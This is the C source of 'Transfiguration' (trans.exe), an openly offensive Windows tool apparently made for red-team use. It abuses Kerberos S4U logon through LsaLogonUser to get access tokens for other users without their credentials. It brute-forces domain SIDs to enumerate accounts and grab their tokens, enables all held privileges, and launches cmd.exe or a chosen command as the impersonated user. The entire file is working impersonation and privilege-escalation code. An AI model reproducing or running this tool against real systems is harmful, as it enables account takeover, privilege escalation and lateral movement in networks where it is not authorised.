#include "windows.h"
#include "stdio.h"
#include "ntsecapi.h"
#include "sddl.h" // sid
#include "wtsapi32.h" // WTS

#pragma comment(lib, "wtsapi32.lib") // WTS
#pragma comment(lib, "secur32.lib") 
#pragma comment(lib, "advapi32.lib")

// The lazy mans way...
const int thread_ammount = 500;
HANDLE threadHandels[500];
HANDLE tokenHandels[500];
DWORD counter = 0;
BOOL verbose = TRUE;

/////////////////////////////////
// Utils-------------------------
static void ErrorCheck(DWORD err)
{
	if (err)
	{
		wchar_t buf[256];
		FormatMessageW(FORMAT_MESSAGE_FROM_SYSTEM, NULL, err, MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT), buf, 256, NULL);
		wprintf(buf);
	}
}

static void ErrorCheckNT(NTSTATUS err)
{
	if (err)
	{
		wchar_t buf[256];
		FormatMessageW(FORMAT_MESSAGE_FROM_SYSTEM, NULL, LsaNtStatusToWinError(err), MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT), buf, 256, NULL);
		wprintf(L"NT Error:  %s", buf);
	}
}

void MyGetUser()
{
	wchar_t* pUserName;
	DWORD cbUserName = 0;
	GetUserNameW(NULL, &cbUserName);
	pUserName = malloc(cbUserName * sizeof(wchar_t));
	if (GetUserNameW(pUserName, &cbUserName))
	{
		wprintf(L"You Are: %s\n", (const wchar_t*)pUserName);
	}
}

static void InitLsaString(LSA_STRING* lsastr, char* str)
{
	size_t len = strlen(str);
	lsastr->Length = (USHORT)len;
	lsastr->MaximumLength = lsastr->Length + 1;
	lsastr->Buffer = str;
}

size_t wcsByteLen(const wchar_t* str)
{
	return wcslen(str) * sizeof(wchar_t);
}

void InitUnicodeString(UNICODE_STRING* str, const wchar_t* value, BYTE* buffer, size_t *offset)
{
	size_t size = wcsByteLen(value);
	str->Length = str->MaximumLength = (USHORT)size;
	str->Buffer = (PWSTR)(buffer + (int)*offset);
	memcpy(str->Buffer, value, size);
	*offset += size;
}

// for debugging
void PrintHexStream(DWORD length, PBYTE buffer)
{
	char out[4096]; //bugs!
	char hx[] = "0123456789abcdef";
	int cnt = 0;
	for (DWORD i = 0; i < length; i++)
	{
		out[cnt++] = hx[buffer[i] >> 4];
		out[cnt++] = hx[buffer[i] & 0x0f];
	}
	out[cnt++] = 0;
	printf("%s", out);
}

// lazy...
char* ConvertWcharToChar(wchar_t* source)
{
	size_t gsize = wcslen(source) + 1;
	size_t convertedChars = 0;

	char *nstring = malloc(gsize);
	wcstombs_s(&convertedChars, nstring, gsize, source, _TRUNCATE);
	return nstring;
}

//////////////////////////////////////////////
// Now the Good Stuff -----------------------
void create_process(HANDLE token, wchar_t *command)
{
	STARTUPINFOW si;
	PROCESS_INFORMATION pi;
	DWORD sessionid = 1;
	HANDLE primary_token;

	// We can use Delegate, but it doesnt have creds
	if (!DuplicateTokenEx(token, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &primary_token))
	{
		ErrorCheck(GetLastError());
		return;
	}

	SetTokenInformation(primary_token, TokenSessionId, &sessionid, sizeof(sessionid));

	ZeroMemory(&si, sizeof(STARTUPINFOW));
	si.cb = sizeof(STARTUPINFOW);
	si.lpDesktop = L"WinSta0\\default";

	// Who knew... The Unicode version of this function can modify the contents of the string.
	wchar_t wchar_command[MAX_PATH + 1];
	wcscpy_s(wchar_command, MAX_PATH, command);

	if (CreateProcessAsUserW(
		primary_token,
		NULL,
		wchar_command,
		NULL,
		NULL,
		FALSE,
		CREATE_NEW_CONSOLE,
		NULL,
		L"C:\\",
		&si,
		&pi
		))
	{
		wprintf(L"[+] Created new process with token successfully\n");
	}
	else
	{
		ErrorCheck(GetLastError());
	}
	CloseHandle(primary_token);
}

// crazy function, but it works..
int CreatePrimaryTokenFromThread(HANDLE pToken)
{
	HANDLE rToken = NULL;
	int ret = DuplicateTokenEx(pToken, TOKEN_ALL_ACCESS, NULL, SecurityDelegation, TokenPrimary, &rToken);
	if (!ret)
	{
		CloseHandle(rToken);
		return 1;
	}
	SetThreadToken(NULL, rToken);
	CloseHandle(pToken);
	pToken = rToken;
	return 0;
}


int EnableAllPrivs(HANDLE hToken, BOOL justgetprivcount)
{
	// Once to get the size, worst practice EVER!
	DWORD dwGetSize = 0;
	GetTokenInformation(hToken, TokenPrivileges, NULL, 0, &dwGetSize);
	DWORD dwRetLen = 0;
	LPBYTE lpTokenInfo = malloc(dwGetSize);
	DWORD dwTokeInfoLen = dwGetSize;
	if (!GetTokenInformation(hToken, TokenPrivileges, lpTokenInfo, dwTokeInfoLen, &dwRetLen))
	{
		wprintf(L"There was a error with GetTokenInformation %d\n", GetLastError());
		return 0;
	}
	PTOKEN_PRIVILEGES ptHeldPrivs = (PTOKEN_PRIVILEGES)(lpTokenInfo);
	for (DWORD i = 0; i < ptHeldPrivs->PrivilegeCount; i++)
	{
		PLUID_AND_ATTRIBUTES plAtt = &ptHeldPrivs->Privileges[i];
		wchar_t szName[256] = { 0 };
		DWORD dwName = 256;
		LookupPrivilegeNameW(NULL, &plAtt->Luid, szName, &dwName);
		if (justgetprivcount)
		{
			if (wcscmp(szName, L"SeImpersonatePrivilege") == 0){ wprintf(L"\tSeImpersonatePrivilege\n"); }
			if (wcscmp(szName, L"SeCreateTokenPrivilege") == 0){ wprintf(L"\tSeCreateTokenPrivilege\n"); }
			if (wcscmp(szName, L"SeTcbPrivilege") == 0){ wprintf(L"\tSeTcbPrivilege\n"); }
			if (wcscmp(szName, L"SeTakeOwnershipPrivilege") == 0){ wprintf(L"\tSeTakeOwnershipPrivilege\n"); }
			if (wcscmp(szName, L"SeAssignPrimaryTokenPrivilege") == 0){ wprintf(L"\tSeAssignPrimaryTokenPrivilege\n"); }
			if (wcscmp(szName, L"SeBackupPrivilege") == 0){ wprintf(L"\tSeBackupPrivilege\n"); }
			if (wcscmp(szName, L"SeRestorePrivilege") == 0){ wprintf(L"\tSeRestorePrivilege\n"); }
			if (wcscmp(szName, L"SeDebugPrivilege") == 0){ wprintf(L"\tSeDebugPrivilege\n"); }
			if (wcscmp(szName, L"SeRelabelPrivilege") == 0){ wprintf(L"\tSeRelabelPrivilege\n"); }
			if (wcscmp(szName, L"SeLoadDriverPrivilege") == 0){ wprintf(L"\tSeLoadDriverPrivilege\n"); }

		}
		if (plAtt->Attributes == 0) // 0 = none // 1 default // 2 enable // (3) enabledbydefault // 4 removed
		{
			plAtt->Attributes = SE_PRIVILEGE_ENABLED; // 2
		}
	}
	if (!justgetprivcount) { AdjustTokenPrivileges(hToken, FALSE, ptHeldPrivs, 0, NULL, NULL); }
	return ptHeldPrivs->PrivilegeCount;
}

void GetTokenGroups(HANDLE Token)
{
	TOKEN_GROUPS *Groups1;
	DWORD Size = 0;
	GetTokenInformation(Token, TokenGroups, NULL, Size, &Size);
	Groups1 = (TOKEN_GROUPS *)malloc(Size);
	GetTokenInformation(Token, TokenGroups, Groups1, Size, &Size);

	wprintf(L"TOKEN_GROUPS.GroupCount: %ld\n", Groups1->GroupCount);

	for (DWORD i = 0; i < Groups1->GroupCount; i++)
	{
		PSID_AND_ATTRIBUTES l_pSidAndAttributes = &Groups1->Groups[i];
		LPWSTR l_lpszStringSid = NULL;
		ConvertSidToStringSidW(l_pSidAndAttributes->Sid, &l_lpszStringSid);
		wchar_t Name[256] = { 0 };
		wchar_t DomainName[256] = { 0 };
		DWORD dwName = 256;
		DWORD dwDomainName = 256;
		SID_NAME_USE l_eSidNameUse;

		if (LookupAccountSidW(
			NULL,
			l_pSidAndAttributes->Sid,
			Name,
			&dwName,
			DomainName,
			&dwDomainName,
			&l_eSidNameUse))
		{
			wprintf(L"  TOKEN_GROUPS[%ld]: %s\\%s  [SID]: %s\n", i, DomainName, Name, l_lpszStringSid);
		}
	}
}

HANDLE s4uLogon(wchar_t* user, wchar_t* realm, int type, wchar_t* srcName, wchar_t* orgName, wchar_t* lgProcess_str, PSID pSessionSid)
{
	HANDLE hlsa = NULL;
	LSA_STRING pkgName;
	if (lgProcess_str != NULL)
	{
		LSA_STRING lsalogonProcess;
		LSA_OPERATIONAL_MODE* secMode = malloc(sizeof(LSA_OPERATIONAL_MODE));
		InitLsaString(&lsalogonProcess, ConvertWcharToChar(lgProcess_str));
		ErrorCheckNT(LsaRegisterLogonProcess(&lsalogonProcess, &hlsa, secMode)); // must have SE_TCB
	}
	else
	{
		ErrorCheckNT(LsaConnectUntrusted(&hlsa));
	}

	InitLsaString(&pkgName, "Negotiate");
	ULONG authnPkg;
	ErrorCheckNT(LsaLookupAuthenticationPackage(hlsa, &pkgName, &authnPkg));

	// buffers MUST be contiguous...
	ULONG authInfoSize = sizeof(KERB_S4U_LOGON) + (ULONG)wcsByteLen(realm) + (ULONG)wcsByteLen(user);
	BYTE* authInfoBuf = malloc(authInfoSize);
	ZeroMemory(authInfoBuf, authInfoSize);
	KERB_S4U_LOGON* authInfo = (KERB_S4U_LOGON*)authInfoBuf;
	authInfo->MessageType = KerbS4ULogon;
	size_t offset = sizeof(KERB_S4U_LOGON);
	InitUnicodeString(&authInfo->ClientUpn, user, authInfoBuf, &offset);
	InitUnicodeString(&authInfo->ClientRealm, realm, authInfoBuf, &offset);

	// s4uLogon->Flags = AUTH_REQ_ALLOW_S4U_DELEGATE; // doesn't work
	//PrintHexStream(authInfoSize, authInfoBuf);
	TOKEN_SOURCE tokenSource;
	AllocateLocallyUniqueId(&tokenSource.SourceIdentifier);
	char* tsrc = ConvertWcharToChar(srcName);
	strcpy_s(tokenSource.SourceName, strlen(tsrc) + 1, tsrc);

	LSA_STRING originName;
	InitLsaString(&originName, ConvertWcharToChar(orgName));
	void* profile = 0;
	DWORD cbProfile = 0;
	LUID logonId;
	QUOTA_LIMITS quotaLimits;
	NTSTATUS subStatus;

	HANDLE TokenHandle = NULL;
	
	PTOKEN_GROUPS pGroups = NULL;
	HANDLE g_hHeap = GetProcessHeap();
	if (pSessionSid != NULL)
	{
		pGroups = (PTOKEN_GROUPS)GlobalAlloc(GPTR, sizeof(TOKEN_GROUPS) + 2 * sizeof(SID_AND_ATTRIBUTES));
		pGroups->Groups[pGroups->GroupCount].Attributes = SE_GROUP_ENABLED | SE_GROUP_ENABLED_BY_DEFAULT | SE_GROUP_MANDATORY;
		pGroups->Groups[pGroups->GroupCount].Sid = pSessionSid;
		pGroups->GroupCount++;
	}
	
	NTSTATUS nts = LsaLogonUser(
		hlsa,                                    // [in] LsaRegisterLogonProcess needs SeTcbPrivilege if KERB_S4U_LOGON is used
		&originName,                             // [in] OriginName
		(SECURITY_LOGON_TYPE)type,               // [in] SECURITY_LOGON_TYPE
		authnPkg,                                // [in] LogonType = aka LsaLookupAuthenticationPackage
		authInfo,                                // [in] AuthenticationInformation 
		authInfoSize,                            // [in] AuthenticationInformationLength
		pGroups,                                 // [in] LocalGroups
		&tokenSource,                            // [in] TOKEN_SOURCE 
		&profile,                                // [out] VOID  "ProfileBuffer" 
		&cbProfile,                              // [out] ULONG "ProfileBufferLength"
		&logonId,                                // [out] LUID
		&TokenHandle,                            // [out] TOKEN
		&quotaLimits,                            // [out] QUOTA_LIMITS process quota limits 
		&subStatus                               // [out]
		);
	if (verbose) { ErrorCheckNT(nts); }

	LsaFreeReturnBuffer(profile);
	LsaClose(hlsa);

	return TokenHandle;
}

DWORD WINAPI DummySleepThread(LPVOID lpParam)
{
	SetThreadToken(NULL, *((HANDLE*)lpParam)); // convert back to token handle
	CreatePrimaryTokenFromThread(*((HANDLE*)lpParam)); // now make a primary with our crazy function
	Sleep(1000000);
	return 0;
}

int sidBrute(wchar_t* sSid, wchar_t* sname, wchar_t* dname, int *stype)
{
	PSID rSid;
	ConvertStringSidToSidW(sSid, &rSid);
	DWORD sname_count = 255; // BUGS!
	DWORD dname_count = 255;
	// LsaLookupSids can set the ammount so no spam
	int ret = LookupAccountSidW(
		NULL, // System SID, or DOMAIN
		rSid,
		sname,
		&sname_count,
		dname,
		&dname_count,
		(PSID_NAME_USE)stype
		);
	return ret;
}

void BruteHandler(wchar_t* part_sid, int count, BOOL bruteprivs)
{
	wchar_t sSid[256];
	wchar_t sname[256];
	wchar_t dname[256];
	DWORD tID;
	int stype = 0;
	for (int i = 0; i < count; i++)
	{
		swprintf_s(sSid, 256, L"%s-%d", part_sid, i);
		if (sidBrute(sSid, sname, dname, &stype))
		{
			if (verbose)
			{
				wprintf(L"[*] %s:%s:%s\n", sname, dname, sSid);
			}
			tokenHandels[counter] = s4uLogon(sname, dname, 3, L"NtlmSsp", L"S4U", NULL, NULL);
			if (tokenHandels[counter] != NULL)
			{
				if (bruteprivs)
				{
					int privs = EnableAllPrivs(tokenHandels[counter], TRUE);
					wprintf(L"[!] Privs:%d:%s\\%s\n", privs, dname, sname);
					// GetTokenGroups(tokenHandels[counter]);
					// DumpToken(tokenHandels[counter]);
				}
				else
				{
					threadHandels[counter] = CreateThread(NULL, 0, DummySleepThread, &tokenHandels[counter], 0, &tID);
					wprintf(L"[->]Created[%d]: %s\\%s thread:%d with token:%08x\n", counter, sname, dname, tID, tokenHandels[counter]);
				}
				counter++;
			}
		}
	}
}

BOOL GetLogonSID(PSID pLogonSid)
{
	HANDLE nToken = NULL;
	HANDLE hToken = NULL;
	BOOL bSuccess = FALSE;
	DWORD dwLength = 0;
	DWORD sessionID = 0;
	PTOKEN_GROUPS pTokenGroups = NULL;

	// Get the sessionID, 
	OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &nToken);
	GetTokenInformation(nToken, TokenSessionId, &sessionID, sizeof(sessionID), &dwLength);
	if (sessionID == 0)
	{
		ErrorCheck(GetLastError());
		CloseHandle(nToken);
		return FALSE;
	}


	WTSQueryUserToken(1, &hToken);
	if (hToken == NULL)
	{
		OpenProcessToken(GetCurrentProcess(), TOKEN_ALL_ACCESS, &hToken);
	}

	dwLength = 0;
	GetTokenInformation(hToken, TokenGroups, (LPVOID)pTokenGroups, 0, &dwLength);
	if (dwLength > 0)
	{
		pTokenGroups = malloc(dwLength);
		GetTokenInformation(hToken, TokenGroups, (LPVOID)pTokenGroups, dwLength, &dwLength);

		for (DWORD i = 0; i < pTokenGroups->GroupCount; i++)
		{
			if ((pTokenGroups->Groups[i].Attributes & SE_GROUP_LOGON_ID) == SE_GROUP_LOGON_ID)
			{
				dwLength = GetLengthSid(pTokenGroups->Groups[i].Sid);
				if (CopySid(dwLength, pLogonSid, pTokenGroups->Groups[i].Sid))
				{
					wchar_t* sidOutput;
					ConvertSidToStringSidW(pLogonSid, &sidOutput);
					wprintf(L"Using LogonSession Group: %s\n", sidOutput);
					CloseHandle(nToken);
					CloseHandle(hToken);
					return TRUE;
				}
			}
		}
	}
	return FALSE;
}

//////////////////////////////////////////
// Main and exceptions -------------------
BOOL WINAPI myExceptionHandler(DWORD dwCtrlType)
{
	for (int i = 0; i < thread_ammount; i++)
	{
		if (threadHandels[i] != NULL)
		{
			TerminateThread(threadHandels[i], 1);
			CloseHandle(threadHandels[i]);
			threadHandels[i] = NULL;
		}
		if (tokenHandels[i] != NULL)
		{
			CloseHandle(tokenHandels[i]);
			tokenHandels[i] = NULL;
		}
	}
	return FALSE;
}

// Thanks to the wife for the name :p
void banner()
{
	wprintf(L" _____                     __ _                       _   _             \n");
	wprintf(L"|_   _| __ __ _ _ __  ___ / _(_) __ _ _   _ _ __ __ _| |_(_) ___  _ __  \n");
	wprintf(L"  | || '__/ _` | '_ \\/ __| |_| |/ _` | | | | '__/ _` | __| |/ _ \\| '_ \\ \n");
	wprintf(L"  | || | | (_| | | | \\__ \\  _| | (_| | |_| | | | (_| | |_| | (_) | | | |\n");
	wprintf(L"  |_||_|  \\__,_|_| |_|___/_| |_|\\__, |\\__,_|_|  \\__,_|\\__|_|\\___/|_| |_|\n");
	wprintf(L"                                |___/                       By @vvalien1\n\n");
}

int wmain(int argc, wchar_t* argv[])
{
	__try
	{
		SetConsoleCtrlHandler(myExceptionHandler, TRUE); // cntrl+c
		wchar_t* srcName = L"NtlmSsp";
		wchar_t* orgName = L"S4U";
		wchar_t* lgProcess_str = NULL;
		int logonType = 3; //SECURITY_LOGON_TYPE::Network;
		banner();
		if (argc < 3)
		{
			wprintf(L"Usage: trans.exe brute [DomainSid] 2000\n");
			wprintf(L"Usage: trans.exe bruteprivs [DomainSid] 2000\n");
			wprintf(L"Usage: trans.exe [Username] [Domain] [Command]\n");
			wprintf(L"Usage: trans.exe [Username] [Domain] [LogonType] [TokenSourceName] [OriginName] [LogonProcessName]\n");
			wprintf(L"To get Impersonate tokens or use LogonProcessName we need the SeTcbPrivilege... aka SYSTEM\n");
			return 1;
		}
		//// Do the Privs Thing!
		HANDLE pToken;
		OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &pToken);
		EnableAllPrivs(pToken, FALSE);
		CloseHandle(pToken);
		//// Do the Sid Thing!
		PSID pLogonSid = (PSID)malloc(255);
		if (!GetLogonSID(pLogonSid))
		{
			pLogonSid = NULL;
		}
		//// Do the Args Thing!
		if (argc == 4)
		{
			if (_wcsicmp(L"brute", argv[1]) == 0)
			{
				verbose = FALSE;
				logonType = _wtoi(argv[3]);
				wprintf(L"BruteForce with SID:%s-[0-%s]\n", argv[2], argv[3]);
				BruteHandler(argv[2], _wtoi(argv[3]), FALSE);
				wprintf(L"Sleeping...\n");
				Sleep(1000000);
			}
			else if (_wcsicmp(L"bruteprivs", argv[1]) == 0)
			{
				logonType = _wtoi(argv[3]);
				wprintf(L"BruteForce with SID:%s-[0-%s]\n", argv[2], argv[3]);
				BruteHandler(argv[2], _wtoi(argv[3]), TRUE);
			}
			else
			{
				wprintf(L"Using: Username:%s Domain:%s LogonType:%d\n", argv[1], argv[2], logonType);
				tokenHandels[0] = s4uLogon(argv[1], argv[2], logonType, L"NtlmSsp", L"S4U", NULL, pLogonSid);
				if (tokenHandels[0] != NULL)
				{
					create_process(tokenHandels[0], argv[3]);
				}
			}
		}
		if (argc == 5 && _wcsicmp(L"authtest", argv[1]) == 0)
		{
			logonType = _wtoi(argv[4]);
			wprintf(L"Using: Username:%s Domain:%s LogonType:%d\n", argv[2], argv[3], logonType);
			tokenHandels[0] = s4uLogon(argv[2], argv[3], logonType, L"NtlmSsp", L"S4U", NULL, pLogonSid);
			if (tokenHandels[0] != NULL)
			{
				//DumpToken(tokenHandels[0]);
				//TempSpawn(tokenHandels[0]);
				//GetAuthLevel(tokenHandels[0]);
				//StartClientGeneration(tokenHandels[0]);
				create_process(tokenHandels[0], L"cmd.exe");
				SetThreadToken(NULL, tokenHandels[0]);
				MyGetUser();
			}
		}
		else if (argc == 7)
		{
			srcName = argv[4]; // TokenSourceName
			orgName = argv[5]; // OriginalName
			lgProcess_str = argv[6]; // SecurityService
			wprintf(L"Using: Username:%s Domain:%s LogonType:%d TokenName:%s OriginName:%s LogonProc:%s \n", argv[1], argv[2], logonType, srcName, orgName, lgProcess_str);
			tokenHandels[0] = s4uLogon(argv[1], argv[2], logonType, srcName, orgName, lgProcess_str, NULL);
			if (tokenHandels[0] != NULL)
			{
				create_process(tokenHandels[0], L"cmd.exe");
				SetThreadToken(NULL, tokenHandels[0]);
				MyGetUser();
			}
		}
		wprintf(L"Goodbye...\n");
		return 0;
	}
	// Do the Cleanup Thing!
	__finally
	{
		myExceptionHandler(0);
	}
}
